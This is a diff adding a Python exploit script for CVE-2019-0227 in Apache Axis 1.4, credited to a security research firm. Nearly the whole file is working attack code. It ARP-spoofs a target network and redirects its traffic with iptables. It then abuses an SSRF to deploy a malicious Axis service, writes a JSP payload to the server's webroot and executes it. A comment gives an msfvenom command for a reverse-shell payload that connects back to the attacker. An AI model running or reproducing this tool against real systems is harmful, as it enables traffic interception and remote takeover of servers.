@@ -1,0 +1,111 @@
+#+++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++#
+#	Apache Axis 1.4 Remote Code Execution CVE-2019-0227                                             #
+#https://rhinosecuritylabs.com/Application-Security/CVE-2019-0227-Expired-Domain-to-RCE-in-Apache-Axis  #
+#	Author: David Yesland @daveysec, Rhino Security Labs				                #
+#	This exploits Apache Axis < 1.4 to upload and execute a JSP payload using MITM                  #
+#	by forcing an http request using the default StockQuoteService.jws service.                     #
+#       You need to be on the same network as the Axis server to make this work.                        #
+#	A lot of this exploit is based on the research from:                                            #
+#	https://www.ambionics.io/blog/oracle-peoplesoft-xxe-to-rce                                      #
+#+++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++#
+
+import SimpleHTTPServer
+import SocketServer
+import subprocess
+from time import sleep
+import thread
+import requests
+from urllib import quote_plus
+import sys
+
+#Usage: python CVE-2019-0227.py shell.jsp
+
+#You need to change these variable to match your configuration
+myip = "192.168.0.117" #IP of your machine
+target = "192.168.0.102" #IP of target
+gateway = "192.168.0.1" #default gateway
+targetport = "8080" #Port of target running axis (probably 8080)
+pathtoaxis = "http://192.168.0.102:8080/axis" #This can be custom depending on the Axis install, but this is default
+spoofinterface = "eth0" #Interface for arpspoofing
+jspwritepath = "webapps\\axis\\exploit.jsp" #relative path on the target to write the JSP payload This is the default on a Tomcat install
+
+#msfvenom -p java/jsp_shell_reverse_tcp LHOST=<Your IP Address> LPORT=<Your Port to Connect On> -f raw > shell.jsp
+payloadfile = open(sys.argv[1],'r').read() #Some file containing a JSP payload
+
+#craft URL to deploy a service as described here https://www.ambionics.io/blog/oracle-peoplesoft-xxe-to-rce
+deployurl = 'http://localhost:'+targetport+'/axis/services/AdminService?method=%21--%3E%3Cns1%3Adeployment+xmlns%3D%22http%3A%2F%2Fxml.apache.org%2Faxis%2Fwsdd%2F%22+xmlns%3Ajava%3D%22http%3A%2F%2Fxml.apache.org%2Faxis%2Fwsdd%2Fproviders%2Fjava%22+xmlns%3Ans1%3D%22http%3A%2F%2Fxml.apache.org%2Faxis%2Fwsdd%2F%22%3E%3Cns1%3Aservice+name%3D%22exploitservice%22+provider%3D%22java%3ARPC%22%3E%3CrequestFlow%3E%3Chandler+type%3D%22RandomLog%22%2F%3E%3C%2FrequestFlow%3E%3Cns1%3Aparameter+name%3D%22className%22+value%3D%22java.util.Random%22%2F%3E%3Cns1%3Aparameter+name%3D%22allowedMethods%22+value%3D%22%2A%22%2F%3E%3C%2Fns1%3Aservice%3E%3Chandler+name%3D%22RandomLog%22+type%3D%22java%3Aorg.apache.axis.handlers.LogHandler%22+%3E%3Cparameter+name%3D%22LogHandler.fileName%22+value%3D%22'+quote_plus(jspwritepath)+'%22+%2F%3E%3Cparameter+name%3D%22LogHandler.writeToConsole%22+value%3D%22false%22+%2F%3E%3C%2Fhandler%3E%3C%2Fns1%3Adeployment'
+
+#craft URL to undeploy a service as described here https://www.ambionics.io/blog/oracle-peoplesoft-xxe-to-rce
+undeployurl = 'http://localhost:'+targetport+'/axis/services/AdminService?method=%21--%3E%3Cns1%3Aundeployment+xmlns%3D%22http%3A%2F%2Fxml.apache.org%2Faxis%2Fwsdd%2F%22+xmlns%3Ans1%3D%22http%3A%2F%2Fxml.apache.org%2Faxis%2Fwsdd%2F%22%3E%3Cns1%3Aservice+name%3D%22exploitservice%22%2F%3E%3C%2Fns1%3Aundeployment'
+
+
+def CreateJsp(pathtoaxis,jsppayload):
+    url = pathtoaxis+"/services/exploitservice"
+    headers = {"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:64.0) Gecko/20100101 Firefox/64.0", "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8", "Accept-Language": "en-US,en;q=0.5", "Accept-Encoding": "gzip, deflate", "Connection": "close", "Upgrade-Insecure-Requests": "1", "SOAPAction": "something", "Content-Type": "text/xml;charset=UTF-8"}
+    data="<?xml version=\"1.0\" encoding=\"utf-8\"?>\r\n        <soapenv:Envelope xmlns:xsi=\"http://www.w3.org/2001/XMLSchema-instance\"\r\n        xmlns:api=\"http://127.0.0.1/Integrics/Enswitch/API\"\r\n        xmlns:xsd=\"http://www.w3.org/2001/XMLSchema\"\r\n        xmlns:soapenv=\"http://schemas.xmlsoap.org/soap/envelope/\">\r\n        <soapenv:Body>\r\n        <api:main\r\n        soapenv:encodingStyle=\"http://schemas.xmlsoap.org/soap/encoding/\">\r\n            <api:in0><![CDATA[\r\n"+jsppayload+"\r\n]]>\r\n            </api:in0>\r\n        </api:main>\r\n  </soapenv:Body>\r\n</soapenv:Envelope>"
+    requests.post(url, headers=headers, data=data)
+
+def TriggerSSRF(pathtoaxis):
+    url = pathtoaxis+"/StockQuoteService.jws"
+    headers = {"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:64.0) Gecko/20100101 Firefox/64.0", "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8", "Accept-Language": "en-US,en;q=0.5", "Accept-Encoding": "gzip, deflate", "Connection": "close", "Upgrade-Insecure-Requests": "1", "SOAPAction": "", "Content-Type": "text/xml;charset=UTF-8"}
+    data="<soapenv:Envelope xmlns:xsi=\"http://www.w3.org/2001/XMLSchema-instance\" xmlns:xsd=\"http://www.w3.org/2001/XMLSchema\" xmlns:soapenv=\"http://schemas.xmlsoap.org/soap/envelope/\" xmlns:def=\"http://DefaultNamespace\">\r\n   <soapenv:Header/>\r\n   <soapenv:Body>\r\n      <def:getQuote soapenv:encodingStyle=\"http://schemas.xmlsoap.org/soap/encoding/\">\r\n         <symbol xsi:type=\"xsd:string\">dwas</symbol>\r\n      </def:getQuote>\r\n   </soapenv:Body>\r\n</soapenv:Envelope>"
+    requests.post(url, headers=headers, data=data)
+
+
+def StartMitm(interface,target,gateway):
+	subprocess.Popen("echo 1 > /proc/sys/net/ipv4/ip_forward",shell=True)#Enable forwarding
+	subprocess.Popen("arpspoof -i {} -t {} {}".format(interface,target,gateway),shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)#spoof target -> gateway
+	subprocess.Popen("iptables -t nat -A PREROUTING -p tcp --dport 80 -j NETMAP --to {}".format(myip),shell=True)#use iptable to redirect back to our web server
+
+
+def KillMitm(target,myip):
+	subprocess.Popen("pkill arpspoof",shell=True)
+	subprocess.Popen("echo 0 > /proc/sys/net/ipv4/ip_forward",shell=True)
+	subprocess.Popen("iptables -t nat -D PREROUTING -p tcp --dport 80 -j NETMAP --to {}".format(myip),shell=True)
+
+
+def SSRFRedirect(new_path):
+	class myHandler(SimpleHTTPServer.SimpleHTTPRequestHandler):
+	   def do_GET(self):
+	       self.send_response(301)
+	       self.send_header('Location', new_path)
+	       self.end_headers()
+	PORT = 80
+	SocketServer.TCPServer.allow_reuse_address = True
+	handler = SocketServer.TCPServer(("", PORT), myHandler)
+	print "[+] Waiting to redirect"
+	handler.handle_request()
+	print "[+] Payload URL sent"
+
+
+def ExecuteJsp(pathtoaxis):
+	subprocess.Popen("curl "+pathtoaxis+"/exploit.jsp",shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
+
+print "[+] Starting MITM"
+StartMitm(spoofinterface,target,gateway)
+sleep(2)
+
+print "[+] Starting web server for SSRF"
+thread.start_new_thread(SSRFRedirect,(deployurl,))
+
+print "[+] Using StockQuoteService.jws to trigger SSRF"
+TriggerSSRF(pathtoaxis)
+print "[+] Waiting 3 seconds for incoming request"
+sleep(3)
+
+print "[+] Writing JSP payload"
+CreateJsp(pathtoaxis,payloadfile)
+
+print "[+] Cleaning up exploit service"
+thread.start_new_thread(SSRFRedirect,(undeployurl,))
+TriggerSSRF(pathtoaxis)
+
+print "[+] Cleaning up man in the middle"
+KillMitm(target,myip)
+
+print "[+] Waiting 2 seconds for JSP write"
+sleep(2)
+ExecuteJsp(pathtoaxis)
+
+print "[+] Default URL to the jsp payload:"
+print pathtoaxis+"/exploit.jsp"
